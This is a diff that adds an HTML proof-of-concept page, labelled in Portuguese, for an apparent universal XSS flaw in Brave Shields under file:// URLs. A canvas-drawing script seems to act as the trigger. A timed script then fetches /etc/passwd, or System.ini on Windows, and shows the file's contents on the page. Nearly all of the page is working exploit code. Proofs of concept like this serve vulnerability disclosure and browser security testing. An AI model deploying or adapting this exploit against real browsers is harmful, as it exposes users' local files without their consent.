@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Brave Shields file:// UXSS PoC</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: sans-serif; }
+        pre { background-color: #eee; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }
+        #trigger { width: 1px; height: 1px; }
+    </style>
+</head>
+<body>
+
+<h1>Brave Shields file:// UXSS PoC</h1>
+<p><strong>Alvo:</strong> <code id="target-path">/etc/passwd</code></p>
+
+<canvas id="trigger" width="1" height="1"></canvas>
+<script>
+    try {
+        const canvas = document.getElementById('trigger');
+        const ctx = canvas.getContext('2d');
+        ctx.fillText('trigger', 0, 0);
+    } catch (e) {}
+</script>
+
+<h2>Resultado:</h2>
+<pre id="output">Tentando ler...</pre>
+
+<script>
+    async function tryReadFile() {
+        const output = document.getElementById('output');
+        let filePath = navigator.platform.toUpperCase().includes('WIN') ?
+            'file:///C:/Windows/System.ini' : 'file:///etc/passwd';
+
+        document.getElementById('target-path').textContent = filePath.replace('file://', '');
+        output.textContent = `Tentando acessar: ${filePath}\n\n`;
+
+        try {
+            const response = await fetch(filePath);
+            if (response.ok) {
+                const content = await response.text();
+                output.textContent += "SUCESSO:\n========================================\n" + content + "\n========================================";
+                output.style.backgroundColor = "#d4edda";
+                output.style.borderColor = "#c3e6cb";
+            } else {
+                output.textContent += `FALHA: ${response.status} ${response.statusText}\n`;
+                output.style.backgroundColor = "#f8d7da";
+                output.style.borderColor = "#f5c6cb";
+            }
+        } catch (e) {
+            output.textContent += `ERRO: ${e.name} - ${e.message}`;
+            output.style.backgroundColor = "#f8d7da";
+            output.style.borderColor = "#f5c6cb";
+        }
+    }
+
+    setTimeout(tryReadFile, 1500);
+</script>
+
+</body>
+</html>
